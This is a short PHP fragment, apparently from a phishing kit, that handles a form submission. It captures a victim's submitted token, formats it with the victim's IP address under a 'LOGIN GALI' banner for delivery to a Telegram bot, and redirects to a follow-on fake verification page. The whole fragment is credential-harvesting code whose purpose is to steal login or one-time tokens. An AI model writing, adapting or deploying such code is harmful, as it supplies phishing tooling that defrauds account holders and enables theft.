...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    // datos post
    $nombre = isset($_POST['tok']) ? $_POST['tok'] : '';
    ...
    // Construye el mensaje a enviar al bot de Telegram con la opción HTML
    $message = "<b>=== LOGIN GALI ===</b>\n";
    $message .= "<i>👤| TOKEN 1:</i> <code>$nombre</code>\n";
    $message .= "<b>=====================</b>\n";
    $message .= "<i>📌| IP:</i> $ip\n";
    ...
    header("Location: tokenvery2.html");
    exit;
}
